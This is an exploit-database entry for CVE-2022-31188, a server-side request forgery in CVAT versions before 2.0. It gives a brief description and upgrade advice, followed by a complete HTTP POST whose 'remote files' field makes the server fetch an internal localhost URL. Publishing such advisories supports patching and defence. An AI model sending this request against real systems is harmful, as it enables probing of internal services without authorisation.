---
title: CVAT 2.0 Server-Side Request Forgery
url: https://cxsecurity.com/issue/WLB-2022110012
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2022-11-13
fetch_date: 2025-10-03T22:37:30.974809
---

# CVAT 2.0 Server-Side Request Forgery

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **CVAT 2.0 Server-Side Request Forgery** **2022.11.12**  Credit:  **[Emir Polat](https://cxsecurity.com/author/Emir%2BPolat/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2022-31188](https://cxsecurity.com/cveshow/CVE-2022-31188/ "Click to see CVE-2022-31188")**  CWE: **[CWE-918](https://cxsecurity.com/cwe/CWE-918 "CWE-918")** | |

#Exploit Title: CVAT 2.0 - SSRF (Server Side Request Forgery)
#Exploit Author: Emir Polat
#Vendor Homepage: https://github.com/opencv/cvat
#Version: < 2.0.0
#Tested On: Version 1.7.0 - Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-122-generic x86\_64)
#CVE: CVE-2022-31188
# Description:
#CVAT is an opensource interactive video and image annotation tool for computer vision. Versions prior to 2.0.0 were found to be subject to a Server-side request forgery (SSRF) vulnerability.
#Validation has been added to urls used in the affected code path in version 2.0.0. Users are advised to upgrade.
POST /api/v1/tasks/2/data HTTP/1.1
Host: localhost:8080
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:97.0) Gecko/20100101 Firefox/97.0
Accept: application/json, text/plain, \*/\*
Accept-Language:en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Authorization: Token 06d88f739a10c7533991d8010761df721b790b7
X-CSRFTOKEN:65s9UwX36e9v8FyiJi0KEzgMigJ5pusEK7dU4KSqgCajSBAYQxKDYCOEVBUhnIGV
Content-Type: multipart/form-data; boundary=-----------------------------251652214142138553464236533436
Content-Length: 569
Origin: http://localhost:8080
Connection: close
Referer:http://localhost:8080/tasks/create
Cookie: csrftoken=65s9UwX36e9v8FyiJi0KEzgMigJ5pusEK7dU4KSqgCajSBAYQxKDYCOEVBUhnIGv; sessionid=dzks19fhlfan8fgq0j8j5toyrh49dned
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
-----------------------------251652214142138553464236533436
Content-Disposition: form-data; name="remote files[0]"
http://localhost:8081
-----------------------------251652214142138553464236533436
Content-Disposition: form-data; name=" image quality"
170
-----------------------------251652214142138553464236533436
Content-Disposition: form-data; name="use zip chunks"
true
-----------------------------251652214142138553464236533436
Content-Disposition: form-data; name="use cache"
true
-----------------------------251652214142138553464236533436--

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2022110012)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top